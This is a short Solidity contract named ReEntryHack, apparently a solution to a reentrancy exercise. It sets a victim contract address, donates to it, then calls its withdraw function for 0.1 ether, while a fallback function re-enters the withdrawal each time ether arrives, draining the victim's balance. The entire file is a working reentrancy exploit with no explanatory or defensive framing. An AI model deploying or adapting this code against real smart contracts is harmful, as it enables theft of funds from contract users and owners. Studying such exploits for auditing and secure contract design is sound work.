
pragma solidity ^0.8.0;

contract ReEntryHack {
    address payable public addressToHack;

    function setVictimAddress(address payable _addressToHack) public {
        addressToHack = _addressToHack;
    }

    function donate(address donationAddress, uint amount) public payable {
        bytes memory payload = abi.encodeWithSignature("donate(address)", address(donationAddress));
        addressToHack.call{value: msg.value}(payload);
    }

    function maliciousWithdraw() public payable {
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 0.1 ether);
        payable(addressToHack).call(payload);
    }
    
    fallback() external payable {
        maliciousWithdraw();
    }
}
